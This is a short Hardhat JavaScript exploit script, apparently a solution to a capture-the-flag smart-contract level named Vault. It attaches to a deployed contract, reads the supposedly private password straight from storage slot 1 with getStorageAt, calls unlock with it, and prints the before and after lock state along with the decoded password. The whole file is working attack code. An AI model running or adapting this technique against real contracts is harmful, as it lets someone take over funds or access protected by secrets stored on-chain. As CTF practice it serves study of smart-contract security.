const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  const VaultContract = await hre.ethers.getContractFactory("Vault");
  // attach your instance address
  const Instance = "0x1886A9864EeDfBA3Cb5b0A609e14DAB74b296607";
  const Vault = VaultContract.attach(Instance);
  const lock = await Vault.locked();
  const password = await ethers.provider.getStorageAt(Vault.address, 1);
  const tx = await Vault.unlock(password);
  await tx.wait(1);
  const locked = await Vault.locked();
  console.log(lock, locked, ethers.utils.parseBytes32String(password));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
